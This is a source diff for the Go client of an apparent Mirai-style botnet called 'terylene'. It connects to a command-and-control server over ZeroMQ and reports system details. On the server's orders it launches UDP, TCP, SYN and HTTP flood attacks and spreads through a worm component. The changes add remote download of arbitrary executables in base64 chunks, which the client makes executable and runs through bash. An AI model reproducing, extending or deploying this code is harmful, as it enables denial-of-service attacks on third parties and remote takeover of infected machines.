@@ -2,11 +2,14 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
+	"errors"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
-	"strconv"
+	"path/filepath"
+	"regexp"
 	"strings"
 	"sync"
 	config "terylene/config"
@@ -14,15 +17,23 @@ import (
 	system "terylene/mirai/components/system"
 	"terylene/mirai/components/worm"
 	attack "terylene/mirai/ddos"
-
 	"time"
 
+	"github.com/fatih/color"
 	zmq "github.com/pebbe/zmq4"
 )
 
-var (
-	dealmut sync.Mutex
-)
+type Method struct {
+	name         string
+	path         string
+	flag_entries []methflag
+	rawformat    string
+}
+
+type methflag struct {
+	entry     string
+	entrytype string
+}
 
 type postC2info struct {
 	C2ip  string
@@ -43,6 +54,22 @@ type zmqinstance struct {
 	zcontext    *zmq.Context
 	zdealer     *zmq.Socket
 	zsubscriber *zmq.Socket
+}
+
+var (
+	dealmut        sync.Mutex
+	custom_methods = make([]Method, 0)
+)
+
+func isValidType(t string) bool {
+	validTypes := map[string]bool{
+		"string": true,
+		"ip":     true,
+		"port":   true,
+		"int":    true,
+	}
+
+	return validTypes[t]
 }
 
 func getFreshSocket() (nzmqinst zmqinstance) {
@@ -78,7 +105,7 @@ func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{
 		log.Println("Reconnection triggered")
 		nzmqinst := getFreshSocket()
 		log.Println("reconnecting...")
-		err := register(nzmqinst, postC2info, time.Second*15)
+		err := register(nzmqinst, postC2info, time.Minute*30)
 		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 			log.Println("reconnection timed out , returning to mother")
 			nzmqinst.zsubscriber.SetLinger(0)
@@ -94,7 +121,8 @@ func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{
 		zmqinst.zcontext.Term()
 		log.Println("Migration triggered")
 		nzmqinst := getFreshSocket()
-		err := register(nzmqinst, miginfo, time.Second*15)
+		RemoveAllMethods()
+		err := register(nzmqinst, miginfo, time.Minute*30)
 		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 			log.Println("Migration timed out , returning to mother")
 			nzmqinst.zsubscriber.SetLinger(0)
@@ -111,6 +139,8 @@ func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{
 
 func returntomother() {
 
+	RemoveAllMethods()
+
 	nzmqinst := getFreshSocket()
 
 	err := register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Hour*168)
@@ -121,6 +151,33 @@ func returntomother() {
 	}
 }
 
+func RemoveAllMethods() error {
+	err := filepath.Walk("methods", func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		if path == "methods" {
+			return nil
+		}
+		if info.IsDir() {
+			err := os.RemoveAll(path)
+			if err != nil {
+				return err
+			}
+		} else {
+			err := os.Remove(path)
+			if err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		return err
+	}
+	return nil
+}
 func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown, dealdown chan struct{}, recsignal chan<- struct{}, submigsignal chan struct{}, dealmigsignal chan postC2info, migsignal chan postC2info) {
 	for {
 		select {
@@ -159,9 +216,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 					log.Fatalln(err)
 				}
 
-				arch, OS, pubip := system.GETSYSTEM()
+				arch, OS, pubip, localip := system.GETSYSTEM()
 
-				localip, err := system.GETIPDNS()
 				if err != nil {
 					log.Fatalln(err)
 				}
@@ -172,7 +228,10 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
 				res, err := ndealer.RecvMessage(0)
-				fmt.Println(res)
+				if err != nil {
+					log.Fatalln(err)
+				}
+
 				if res[0] == "terylene" {
 					go dealerhandle(ndealer, dealdown, migsignal, res[2])
 				} else {
@@ -187,7 +246,7 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				log.Println("dealer channel ready for migration")
 				migsignal <- postinfo
 				break
-			case <-time.After(time.Second * 5):
+			case <-time.After(time.Second * 20):
 				log.Println("dealer channel not ready for migration")
 				log.Println("reconnecting to subscriber")
 				subscriber, err := zmqins.zcontext.NewSocket(zmq.SUB)
@@ -202,7 +261,7 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 			case <-submigsignal:
 				log.Println("subscriber channel ready for migration")
 				migsignal <- postinfo
-			case <-time.After(time.Second * 5):
+			case <-time.After(time.Second * 20):
 				log.Println("subscriber channel not ready for migration")
 				log.Println("reconnecting to dealer")
 				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
@@ -212,9 +271,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				log.Println("reregisteration initiating")
 
 				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
-				arch, OS, pubip := system.GETSYSTEM()
+				arch, OS, pubip, localip := system.GETSYSTEM()
 
-				localip, err := system.GETIPDNS()
 				if err != nil {
 					log.Fatalln(err)
 				}
@@ -224,8 +282,7 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 
 				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
-				res, err := ndealer.RecvMessage(0)
-				fmt.Println(res)
+				res, _ := ndealer.RecvMessage(0)
 
 				if res[0] == "terylene" {
 					go dealerhandle(ndealer, dealdown, migsignal, res[2])
@@ -238,6 +295,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 }
 
 func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) error {
+
+	RemoveAllMethods()
 
 	dealer := zmqins.zdealer
 	subscriber := zmqins.zsubscriber
@@ -256,12 +315,11 @@ func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) er
 	migsignal := make(chan postC2info)
 	submigsignal := make(chan struct{})
 
-	localip, err := system.GETIPDNS()
 	if err != nil {
 		log.Fatalln(err)
 	}
 
-	arch, OS, pubip := system.GETSYSTEM()
+	arch, OS, pubip, localip := system.GETSYSTEM()
 
 	log.Println("generating Conn ID")
 	connId := system.GenerateConnID(localip, pubip)
@@ -374,14 +432,12 @@ func cmdhandler(command string, key []byte, dealer *zmq.Socket) {
 
 	cmd := exec.Command(parts[0], parts[1:]...)
 
-	// Get pipe for standard output
 	stdout, err := cmd.StdoutPipe()
 	if err != nil {
 		fmt.Println("Error creating StdoutPipe for Cmd", err)
 		return
 	}
 
-	// Start command
 	if err := cmd.Start(); err != nil {
 		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(err.Error()), key)
 		if err != nil {
@@ -483,14 +539,76 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 	}
 }
 
+func methodentry(rawformat string) ([]methflag, error) {
+	var flags []methflag
+	seen := make(map[string]bool)
+	ifmain := false
+
+	pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
+	re := regexp.MustCompile(pattern)
+
+	matches := re.FindAllStringSubmatch(rawformat, -1)
+
+	if len(matches) == 0 {
+		return flags, errors.New("there are no entry")
+	}
+
+	for _, match := range matches {
+
+		if match[1] == "main" {
+			ifmain = true
+		}
+
+		if seen[match[1]] {
+			color.Red("duplication value detected:%s", match[1])
+			return flags, fmt.Errorf("duplication value detected:%s", match[1])
+		} else {
+			seen[match[1]] = true
+		}
+
+		if !isValidType(match[2]) {
+			return flags, fmt.Errorf("invalid type '%s' for %s entry", match[2], match[1])
+		}
+
+		flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
+	}
+
+	if !ifmain {
+		return flags, errors.New("format has no main argument")
+	}
+
+	return flags, nil
+}
+
+func deletemethod(methodName string) {
+	for i, method := range custom_methods {
+		if method.name == methodName {
+			custom_methods = append(custom_methods[:i], custom_methods[i+1:]...)
+			os.Remove(method.path)
+
+			log.Println(methodName, "deleted successfully")
+			return
+		}
+	}
+
+	log.Println("no method found with name: ", methodName)
+}
 func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}, submigsignal chan<- struct{}) {
 	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
-	subscriber.SetRcvtimeo(time.Second * 10)
+
+	subscriber.SetRcvtimeo(time.Second * 20)
 	subscriber.SetSubscribe(bot)
 	subscriber.SetSubscribe(connid)
 	log.Printf("subscribed to the %s channel\n", bot)
+
+	var file *os.File
+	var methname string
+	var filename string
+	var filepath string
+
+loop:
 	for {
-		message, err := subscriber.Recv(0)
+		recved, err := subscriber.RecvMessage(0)
 
 		if err != nil {
 			log.Printf("subscriber channel: %s\n", err)
@@ -501,72 +619,168 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 			break
 		}
 
-		if strings.Contains(message, ":migrate") {
-			submigsignal <- struct{}{}
-			break
+		if len(recved) == 0 || len(recved) == 1 {
+			log.Println("malformed message ignored")
+			continue
 		}
 
-		go func(message string) {
-			parts := strings.Split(message, ":")
-			message = parts[1]
-			if strings.Contains(message, "!") {
-				for _, value := range config.Methods {
-					if strings.Contains(message, value) {
-						parts := strings.Fields(message)
-						if len(parts) == 4 {
-							method := strings.TrimPrefix(parts[0], "!")
-							target := parts[1]
-							port, err := strconv.Atoi(parts[2])
-							if err != nil {
-								continue
-							}
-							duration, err := strconv.Atoi(parts[3])
-							if err != nil {
-								continue
-							}
-							fmt.Printf("\n%s started on %s %d %d", method, target, port, duration)
-							switch method {
-							case "UDP":
-								for i := 1; i < 2; i++ {
-									go attack.UDP(target, port, duration)
-								}
-							case "TCP":
-								for i := 1; i < 2; i++ {
-									go attack.TCP(target, port, duration)
-								}
-							case "HTTP":
-								for i := 1; i < 2; i++ {
-									go attack.HTTP(target, duration)
-								}
-							case "UDPRAPE":
-								for i := 1; i < 2; i++ {
-									go attack.UDPRAPE(target, port, duration)
-								}
-							case "SYN":
-								for i := 1; i < 2; i++ {
-									go attack.SYN(target, port, duration)
-								}
-							case "UDP-VIP":
-								for i := 1; i < 2; i++ {
-									go attack.UDP_VIP(target, port, duration)
-								}
-							}
+		if recved[1] == "h" {
+			continue
+		}
+
+		if len(recved) == 3 {
+			if recved[1] == "deletemethod" {
+				deletemethod(recved[2])
+			}
+		}
+		if len(recved) > 2 {
+			switch recved[1] {
+			case "file_start":
+				methname = recved[2]
+				filename = recved[3]
+				filepath = "methods/" + filename
+				file, err = os.Create(filepath)
+
+				if err != nil {
+					log.Printf("failed to create file: %v", err)
+					break
+				}
+				continue
+
+			case "file_chunk":
+				if file != nil && recved[2] == methname {
+					decoded, err := base64.StdEncoding.DecodeString(recved[3])
+					if err != nil {
+						log.Println("failed to decode base64 for file", filename)
+						continue
+					}
+
+					_, err = file.Write(decoded)
+
+					if err != nil {
+						log.Printf("failed to write to file: %v", err)
+						if file != nil {
+							file.Close()
 						}
+						break
 					}
 				}
-			} else {
-				switch message {
-				case "killall":
-					fmt.Println("connection killed by C2 owner")
-					os.Exit(2)
+				continue
+			case "file_end":
+				if file != nil && methname == recved[2] {
+
+					file.Close()
+					file = nil
+
+					rawformat := recved[3]
+
+					entries, err := methodentry(rawformat)
+
+					if err != nil {
+						log.Println(err)
+						break
+					}
+
+					custom_methods = append(custom_methods, Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})
+					log.Println("recieved method", methname, "successfully")
+					err = os.Chmod(filepath, 0755)
+
+					methname = ""
+					filename = ""
+					filepath = ""
+					file = nil
+
+					if err != nil {
+						log.Println("Error:", err)
+						return
+					}
+					continue
 				}
+			case "migrate":
+				submigsignal <- struct{}{}
+				break loop
+			case "killall":
+				os.Exit(2)
 			}
-		}(message)
+		}
+		methodhandler(recved)
 	}
 }
+
+func methodhandler(messages []string) {
+	if len(messages) == 5 {
+		switch messages[1] {
+		case "UDP":
+			go attack.UDP(messages[2], messages[3], messages[4])
+		case "TCP":
+			go attack.TCP(messages[2], messages[3], messages[4])
+		case "HTTP":
+			go attack.HTTP(messages[2], messages[3], messages[4])
+		case "UDPRAPE":
+			go attack.UDPRAPE(messages[2], messages[3], messages[4])
+		case "SYN":
+			go attack.SYN(messages[2], messages[3], messages[4])
+		case "UDP-VIP":
+			go attack.UDP_VIP(messages[2], messages[3], messages[4])
+		}
+	}
+
+	if len(messages) > 1 {
+		for _, value := range custom_methods {
+			if value.name == messages[1] {
+				pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
+
+				regexpPattern := regexp.MustCompile(pattern)
+
+				values := []string{value.path}
+
+				for _, i := range messages {
+					if i == "terylene" || i == value.name {
+						continue
+					}
+					values = append(values, i)
+				}
+
+				// Initialize an index to keep track of which value to replace with
+				valueIndex := 0
+
+				// Replace placeholders with values
+				outputString := regexpPattern.ReplaceAllStringFunc(value.rawformat, func(match string) string {
+					if valueIndex >= len(values) {
+						return match // more values, return the original match
+					}
+
+					// Replace the placeholder with the corresponding value
+					replacement := values[valueIndex]
+					valueIndex++ // Move to the next value
+					return replacement
+				})
+
+				fmt.Println(outputString)
+
+				go func() {
+					cmd := exec.Command("bash", "-c", outputString)
+
+					output, err := cmd.CombinedOutput()
+					if err != nil {
+						fmt.Println("Error executing command:", err)
+						return
+					}
+
+					log.Println(string(output))
+				}()
+
+				return
+			}
+		}
+	}
+}
+
 func main() {
 	go worm.Startworm()
 	nzmqinst := getFreshSocket()
+
+	os.Mkdir("methods", 0755)
 
 	register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Second*10)
 }
